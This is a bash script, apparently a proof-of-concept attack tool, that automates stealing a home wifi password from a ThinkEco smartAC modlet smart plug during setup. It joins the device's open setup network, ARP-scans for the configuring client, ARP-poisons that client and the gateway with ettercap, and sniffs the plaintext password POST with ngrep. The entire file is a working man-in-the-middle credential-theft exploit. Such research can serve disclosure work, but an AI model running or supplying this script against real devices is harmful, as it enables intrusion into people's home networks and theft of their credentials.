#!/bin/bash

# A script to automatically connect to the ThinkEco smartAC modlet
# and sniff the user's home wifi password from the HTTP request

# Prerequisites:
# 1.) ngrep package installed
# 2.) ettercap package installed (ettercap-common, ettercap-text-only)
# 3.) Wireless turned on
# 4.) Run as root (sudo)

# Turn wireless radio on
nmcli radio  wifi on

# Connect to the modlet wifi

# Get the name of the wireless interface
INTERFACE=$(/sbin/iw dev | grep -i 'interface' | cut -d ' ' -f 2-)
if [ $INTERFACE ]
then
    echo "Wireless interface: ${INTERFACE}"
else
    echo "No wireless interface found"
    exit 1
fi

# Kill any possible existing processes or ip leases
killall wpa_supplicant
dhclient -r $INTERFACE > /dev/null 2>&1

# Set the interface to be up
ip link set $INTERFACE up

# Scan for the modlet hosted wireless network
# We know it is in the form of "modletXXXX"
echo "Waiting for a modlet to come online..."
SSID=""
while [ "$SSID" = "" ]
do
    SSID=$(/sbin/iw $INTERFACE scan | grep -i "SSID:" | cut -d ' ' -f 2- | grep -i "modlet")
done
echo "Modlet wifi SSID: ${SSID}"

# Connect to the modlet wifi
echo "Connecting to modlet wifi"
printf "network={\n\tssid=\"$SSID\"\n\tkey_mgmt=NONE\n}" > /tmp/wpa_supplicant.conf
wpa_supplicant -B -i $INTERFACE -c /tmp/wpa_supplicant.conf
dhclient $INTERFACE

# Now that we are connected to the modlet wifi, we can begin the
# spoofing and sniffing process

# Get the current IP and the gateway's IP
GATEWAY="192.168.240.1"
MYIP=$(ip -o addr show | grep $INTERFACE | awk '/inet/ {print $4}' | cut -f 1 -d '/')
echo "Current IP: ${MYIP}"

# Locate the other host on the network for arp poisoning
echo "Waiting for the client to connect..."
TARGET=""
while [ "$TARGET" = "" ]
do
    declare -a IPADDRS
    # ARP scan the network to find the client configuring the modlet
    IPADDRS=($(arp-scan -q -I $INTERFACE -l | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'))

    for IP in "${IPADDRS[@]}"
    do
        if [ "$IP" != "$MYIP" ] && [ "$IP" != "$GATEWAY" ]
        then
            TARGET=$IP
            echo "Target found: ${TARGET}"
            break
        fi
    done
done

# arp-poison the other host and the gateway
echo "ARP poisoning between ${GATEWAY} and ${TARGET}"
ettercap -T -M arp:remote -i $INTERFACE /$GATEWAY// /$TARGET// > /dev/null 2>&1 &

# Sniff the home wifi password using ngrep
# Look for post requests sent when wifi password is submitted
ngrep -q -d $INTERFACE -W byline -n 10 "POST /gainspan/system/config/network" host $TARGET and port 80

